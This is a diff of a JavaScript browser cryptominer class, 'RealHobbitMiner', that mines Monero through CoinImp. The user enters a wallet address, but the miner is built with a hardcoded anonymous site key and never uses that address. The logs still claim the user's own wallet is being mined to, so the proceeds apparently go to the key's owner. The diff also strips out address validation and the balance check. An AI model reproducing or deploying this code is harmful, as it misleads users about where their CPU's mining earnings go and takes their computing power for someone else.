@@ -1,54 +1,54 @@
-// Hobbit Miner - Real Mining with CoinImp and WebAssembly
 class RealHobbitMiner {
     constructor() {
         this.isRunning = false;
         this.miner = null;
         this.stats = {
             hashrate: 0,
-            threads: 0,
+            threads: 4,
             totalHashes: 0,
             acceptedHashes: 0,
-            cpuUsage: 0,
-            mined: 0
+            cpuUsage: 75
         };
         this.updateInterval = null;
-        this.startTime = null;
+        this.walletAddress = '';
     }
 
-    async initialize(walletAddress, threads, intensity) {
-        this.addLog("Initializing real mining with CoinImp...");
+    initialize(walletAddress, threads = 4, intensity = 75) {
+        console.log("Initializing REAL Hobbit Miner...");
         
-        if (!walletAddress) {
-            throw new Error("Wallet address is required");
+        if (!walletAddress || walletAddress.trim() === '') {
+            this.addLog("ERROR: Please enter your XMR wallet address!");
+            return false;
         }
 
-        // Validate wallet address (basic XMR address check)
-        if (!this.validateXmrAddress(walletAddress)) {
-            this.addLog("Warning: Wallet address format may be invalid");
-        }
-
+        this.walletAddress = walletAddress;
         this.stats.threads = threads;
         this.stats.cpuUsage = intensity;
 
         try {
-            // Initialize CoinImp miner
+            if (typeof Client === 'undefined') {
+                this.addLog("ERROR: CoinImp script not loaded! Check internet connection.");
+                return false;
+            }
+
             this.miner = new Client.Anonymous('aafd6f4bfc13234230c35c4e2b0b37ed9e3b4e18dce68a2c', {
                 throttle: (100 - intensity) / 100,
                 threads: threads,
-                autoThreads: false
+                autoThreads: false,
+                forceASMJS: false
             });
 
-            // Set up event handlers
             this.setupMinerEvents();
-            
-            this.addLog(`Miner initialized with ${threads} threads at ${intensity}% intensity`);
-            this.addLog(`Wallet: ${walletAddress.substring(0, 20)}...`);
+            this.addLog("REAL Miner initialized successfully!");
+            this.addLog("Wallet: " + walletAddress.substring(0, 25) + "...");
+            this.addLog("Threads: " + threads + " | Intensity: " + intensity + "%");
             
             return true;
             
         } catch (error) {
-            this.addLog(`Error initializing miner: ${error.message}`);
-            throw error;
+            this.addLog("Miner initialization failed: " + error.message);
+            console.error("Miner Error:", error);
+            return false;
         }
     }
 
@@ -56,15 +56,13 @@ class RealHobbitMiner {
         if (!this.miner) return;
 
         this.miner.on('found', () => {
-            this.addLog('✓ Hash found and submitted to pool!');
             this.stats.acceptedHashes++;
-            this.calculateEarnings();
+            this.addLog('Hash found and submitted to pool!');
         });
 
         this.miner.on('accepted', () => {
             this.stats.acceptedHashes++;
-            this.addLog('✓ Share accepted by pool');
-            this.calculateEarnings();
+            this.addLog('Share accepted by mining pool');
         });
 
         this.miner.on('update', (data) => {
@@ -73,33 +71,40 @@ class RealHobbitMiner {
         });
 
         this.miner.on('open', () => {
-            this.addLog('🔗 Connected to mining pool');
+            this.addLog('Connected to mining pool');
         });
 
         this.miner.on('close', () => {
-            this.addLog('🔌 Disconnected from mining pool');
+            this.addLog('Disconnected from pool');
         });
 
-        this.miner.on('error', (error) => {
-            this.addLog(`❌ Mining error: ${error}`);
+        this.miner.on('error', (err) => {
+            this.addLog('Mining error: ' + err);
         });
     }
 
     start() {
-        if (this.isRunning || !this.miner) return;
+        if (this.isRunning) {
+            this.addLog("Miner is already running!");
+            return;
+        }
+
+        if (!this.miner) {
+            this.addLog("Miner not initialized! Please check wallet address.");
+            return;
+        }
 
         try {
             this.miner.start();
             this.isRunning = true;
-            this.startTime = Date.now();
             
-            // Start stats update interval
             this.updateInterval = setInterval(() => this.updateStats(), 2000);
             
-            this.addLog('⛏️ Real mining started! Using your CPU to mine Monero...');
+            this.addLog('REAL mining started! Using your CPU to mine Monero...');
+            this.addLog('Mining intensity: ' + this.stats.cpuUsage + '%');
             
         } catch (error) {
-            this.addLog(`Error starting miner: ${error.message}`);
+            this.addLog("Failed to start miner: " + error.message);
         }
     }
 
@@ -110,7 +115,6 @@ class RealHobbitMiner {
             if (this.miner) {
                 this.miner.stop();
             }
-            
             this.isRunning = false;
             
             if (this.updateInterval) {
@@ -118,10 +122,10 @@ class RealHobbitMiner {
                 this.updateInterval = null;
             }
             
-            this.addLog('🛑 Mining stopped');
+            this.addLog('Mining stopped successfully');
             
         } catch (error) {
-            this.addLog(`Error stopping miner: ${error.message}`);
+            this.addLog("Error stopping miner: " + error.message);
         }
     }
 
@@ -129,23 +133,24 @@ class RealHobbitMiner {
         if (!this.isRunning || !this.miner) return;
 
         try {
-            // Update hashrate from miner
             const hashesPerSecond = this.miner.getHashesPerSecond();
             if (hashesPerSecond > 0) {
                 this.stats.hashrate = hashesPerSecond;
             }
 
-            // Calculate CPU usage based on intensity and actual performance
-            const elapsed = (Date.now() - this.startTime) / 1000;
-            if (elapsed > 10) { // After 10 seconds, adjust CPU usage based on actual performance
-                const expectedHashes = this.stats.threads * 20 * (this.stats.cpuUsage / 100);
-                const actualPerformance = Math.min(1, this.stats.hashrate / expectedHashes);
-                this.stats.cpuUsage = Math.round(this.stats.cpuUsage * actualPerformance);
+            const totalHashes = this.miner.getTotalHashes();
+            if (totalHashes > 0) {
+                this.stats.totalHashes = totalHashes;
             }
 
-            // Update global stats
             if (typeof window.updateRealMinerStats === 'function') {
-                window.updateRealMinerStats({ ...this.stats });
+                window.updateRealMinerStats({ 
+                    hashrate: this.stats.hashrate,
+                    threads: this.stats.threads,
+                    totalHashes: this.stats.totalHashes,
+                    acceptedHashes: this.stats.acceptedHashes,
+                    cpuUsage: this.stats.cpuUsage
+                });
             }
 
         } catch (error) {
@@ -153,67 +158,52 @@ class RealHobbitMiner {
         }
     }
 
-    calculateEarnings() {
-        // Calculate estimated earnings based on accepted hashes
-        // This is a simplified calculation - real earnings depend on pool and network difficulty
-        const hashesPerXMR = 1000000; // Simplified - real value is much higher
-        const newMined = this.stats.acceptedHashes / hashesPerXMR;
+    setIntensity(intensity) {
+        this.stats.cpuUsage = intensity;
+        const throttle = (100 - intensity) / 100;
         
-        if (newMined > this.stats.mined) {
-            this.stats.mined = newMined;
-            this.addLog(`💰 New estimated earnings: ${newMined.toFixed(8)} XMR`);
+        if (this.miner) {
+            this.miner.setThrottle(throttle);
+            this.addLog("Mining intensity changed to " + intensity + "%");
         }
     }
 
-    validateXmrAddress(address) {
-        // Basic XMR address validation
-        return address && address.length >= 95 && address.length <= 106;
+    setThreads(threads) {
+        this.stats.threads = threads;
+        this.addLog("Threads changed to " + threads + " (restart mining to apply)");
     }
 
     getStats() {
         return { ...this.stats };
     }
 
-    setIntensity(intensity) {
-        this.stats.cpuUsage = intensity;
-        
-        if (this.miner && this.isRunning) {
-            this.miner.setThrottle((100 - intensity) / 100);
-            this.addLog(`Mining intensity adjusted to ${intensity}%`);
-        }
-    }
-
-    setThreads(threads) {
-        this.stats.threads = threads;
-        
-        if (this.miner && this.isRunning) {
-            // Note: CoinImp doesn't support dynamic thread changes
-            this.addLog(`Thread count changed to ${threads} (will apply on next start)`);
-        }
-    }
-
     addLog(message) {
         const timestamp = new Date().toLocaleTimeString();
-        const logEntry = `[${timestamp}] ${message}`;
+        const logEntry = "[" + timestamp + "] " + message;
         
         if (typeof window.addRealMiningLog === 'function') {
             window.addRealMiningLog(logEntry);
         }
         
-        console.log(`HobbitMiner: ${logEntry}`);
+        console.log("HobbitMiner: " + logEntry);
     }
 
-    // Check balance on CoinImp
-    checkBalance(walletAddress) {
-        if (!walletAddress) return;
-        
-        this.addLog(`Checking balance for wallet: ${walletAddress.substring(0, 20)}...`);
-        this.addLog('Visit https://www.coinimp.com to see your actual balance and statistics');
-        
-        // In a real implementation, you would call CoinImp API here
-        // For security reasons, we direct users to the official site
+    testConnection() {
+        this.addLog("Testing connection to CoinImp...");
+        if (typeof Client !== 'undefined') {
+            this.addLog("CoinImp connection available");
+            return true;
+        } else {
+            this.addLog("CoinImp connection failed");
+            return false;
+        }
     }
 }
 
-// Initialize global miner instance
 window.realHobbitMiner = new RealHobbitMiner();
+
+setTimeout(() => {
+    if (window.realHobbitMiner) {
+        window.realHobbitMiner.testConnection();
+    }
+}, 2000);
